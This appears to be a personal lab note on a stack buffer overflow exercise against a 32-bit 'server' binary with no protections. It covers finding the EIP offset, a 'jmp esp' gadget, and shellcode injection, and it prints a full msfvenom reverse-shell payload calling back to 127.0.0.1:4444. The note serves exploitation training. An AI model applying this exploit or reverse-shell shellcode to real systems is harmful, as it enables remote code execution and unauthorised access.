[[Binary Exploitation/05 Injecting shellcode/Source Code|Source Code]] 

### Basic File checks

1. File -> `./server: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=17a0c596cb6e2e09548a395e34cc676cf85ecd26, for GNU/Linux 3.2.0, not stripped`
2. checksec ->
```python
[*] '/root/binary_exploitation/05/server'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

### Manual Exploitation

Now we don't see any interesting function and since it doesn't have any nx enabled we can assume its a shell execution

Let's identify EIP offset

```python
cyclic 100
gdb-pwndbg ./server
```

Result:

```python
*EAX  0xffffcec0 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
*EBX  0x61616172 ('raaa')
*ECX  0xf7e1e9c4 (_IO_stdfile_0_lock) ◂— 0x0
*EDX  0x1
*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
*ESI  0x8049230 (__libc_csu_init) ◂— push ebp
*EBP  0x61616173 ('saaa')
*ESP  0xffffcf10 ◂— 'uaaavaaawaaaxaaayaaa'
*EIP  0x61616174 ('taaa')
```

now the offset is : `76`

Next we need a rop object to jump to the esp because that is where our shell code will be after the EIP is filled with rop object we want it to go to the ESP which has the shellcode we generate using shellcraft

```python
ropper --file ./server --search=jmp
```

Result:

```python
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[INFO] Load gadgets for section: GNU_STACK
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: jmp

[INFO] File: ./server
0x0804919f: jmp esp;
```

Now we need the shellcraft code

We can do this using shellcraft in pwn 

[[Binary Exploitation/05 Injecting shellcode/Python Script#^8c5004|Python Script using shellcraft]]

Now if we want a shell after the code executes we can use msfvenom

we would have to generate the msfvenom payload using

```python
msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f python
```

Result:

```python
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 68 bytes
Final size of python file: 349 bytes
buf =  b""
buf += b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0"
buf += b"\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9"
buf += b"\x68\x7f\x00\x00\x01\x68\x02\x00\x11\x5c\x89\xe1"
buf += b"\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52"
buf += b"\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
buf += b"\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
```

Now we can copy everything for the buf variable and put it into the python script and use that as shown in [[Binary Exploitation/05 Injecting shellcode/Python Script#^1b1fba|Python Script using msfvenom]]






